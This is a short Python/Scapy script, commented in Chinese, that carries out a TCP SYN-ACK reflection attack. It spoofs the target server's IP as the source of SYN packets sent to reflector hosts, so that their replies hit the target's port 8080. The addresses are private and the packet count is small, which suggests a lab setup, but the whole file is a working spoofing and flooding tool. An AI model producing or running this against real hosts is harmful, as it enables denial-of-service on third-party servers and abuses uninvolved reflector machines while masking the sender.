from scapy.all import *
import random
from scapy.layers.inet import TCP, IP


def generate_random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))


def syn_ack_reflection_attack(target_ip, reflector_ips, target_port, count, delay):
    for _ in range(count):
        # 构造随机源IP和端口
        src_ip = generate_random_ip()
        # src_port = random.randint(1024, 65535)
        src_port = 2025

        for reflector_ip in reflector_ips:
            # 构造IP和TCP头部
            ip = IP(src=target_ip, dst=reflector_ip)
            tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(0, 4294967295))

            # 发送SYN包
            send(ip / tcp, verbose=0)
            print(f"Sent TCP SYN packet from {target_ip}:{src_port} to {reflector_ip}:{target_port}")

            # 延迟
            time.sleep(delay)


if __name__ == "__main__":
    # target_ip = "192.168.134.148"  # 目标服务器的IP地址
    # reflector_ips = ["192.168.134.147", "192.168.134.149"]  # 反射器的IP地址列表
    # target_port = 8080  # 目标服务器的端口

    target_ip = "192.168.134.148"  # 目标服务器的IP地址
    reflector_ips = ["192.168.228.128"]  # 反射器的IP地址列表
    target_port = 8080  # 目标服务器的端口

    count = 10  # 要发送的SYN包数量
    delay = 0.01  # 每次发送之间的延迟（秒）

    syn_ack_reflection_attack(target_ip, reflector_ips, target_port, count, delay)